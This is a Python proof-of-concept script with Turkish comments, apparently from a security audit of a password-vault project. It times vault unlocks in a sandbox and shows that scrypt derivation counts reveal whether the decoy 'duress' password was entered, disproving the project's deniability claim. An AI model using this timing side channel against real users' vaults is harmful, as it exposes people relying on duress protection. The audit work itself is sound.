#!/usr/bin/env python3
"""PoC 05: Unlock suresi yan kanali -> 'duress' (baskı altında sahte) parola ifşası.

Zafiyet: unlock_vault() once gercek kasayi, sonra decoy kasayi dener. Derleme sayisi
parola turune gore farkli oldugundan (1 / 3 / 4 adet scrypt) kilit acma suresi duress
parolasini ele verir. README 'matematiksel ve gorsel olarak ayirt edilemez' iddia ediyor.
"""
import os
import sys
import time
import shutil
import statistics

PROJECT_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
SANDBOX = "/tmp/opencode/aegis_poc/poc05"
shutil.rmtree(SANDBOX, ignore_errors=True)
os.makedirs(SANDBOX)
os.chdir(SANDBOX)
sys.path.insert(0, PROJECT_DIR)

import vault_storage as vs
from military_vault import VaultSecurityError

MASTER = "GercekAnaParola!2026"
DURESS = "DuressParola!2026"
PROFILE = "victim"


def banner(title):
    print("\n" + "=" * 72)
    print(" " + title)
    print("=" * 72)


def timed_unlock(password):
    t0 = time.perf_counter()
    try:
        data, is_decoy, eff = vs.unlock_vault(password, profile_name=PROFILE)
        elapsed = (time.perf_counter() - t0) * 1000
        return elapsed, ("MASTER" if not is_decoy else "DURESS")
    except VaultSecurityError:
        elapsed = (time.perf_counter() - t0) * 1000
        return elapsed, "WRONG"


banner("PoC 05: Kilit acma suresi ile duress parolasi tespiti")

vs.init_vault(master_password=MASTER, duress_password=DURESS, profile_name=PROFILE)
print("[+] Kasa master + duress parolalari ile olusturuldu (donanim baglama YOK, keyfile YOK)")

results = {"MASTER": [], "DURESS": [], "WRONG": []}
for _ in range(3):
    for pwd in (MASTER, DURESS, "rastgele-yanlis-parola"):
        ms, kind = timed_unlock(pwd)
        results[kind].append(ms)

print("\n    Olcumler (ms):")
for kind in ("MASTER", "DURESS", "WRONG"):
    vals = results[kind]
    print(f"    {kind:7s}: {['%.1f' % v for v in vals]}  ort={statistics.mean(vals):7.1f} ms")

m = statistics.mean(results["MASTER"])
d = statistics.mean(results["DURESS"])
w = statistics.mean(results["WRONG"])
print(f"\n[!] Duress/Master sure orani: {d / m:.2f}x")
print(f"[!] Wrong/Master sure orani : {w / m:.2f}x")
print(f"[!] Esik asildi mi (duress, master'dan >=2x yavas)? {d >= 2 * m}")

print("\n    Neden: scrypt turetim sayisi parolaya gore degisiyor")
print("      MASTER : gercek kasa 1. aday -> 1 turetim")
print("      DURESS : gercek 2x basarisiz + decoy 1x basarili -> 3 turetim")
print("      WRONG  : gercek 2x + decoy 2x basarisiz -> 4 turetim")

assert d >= 2 * m, "beklenen sure farki olusmadi"

print("\n" + "-" * 72)
print("KANIT: Sadece kronometre ile 'duress parolasi girildi' tespit edilebiliyor.")
print("       'Plausible deniability' iddiasi (ayirt edilemezlik) bu yan kanalla çürütüldü.")
print("-" * 72)
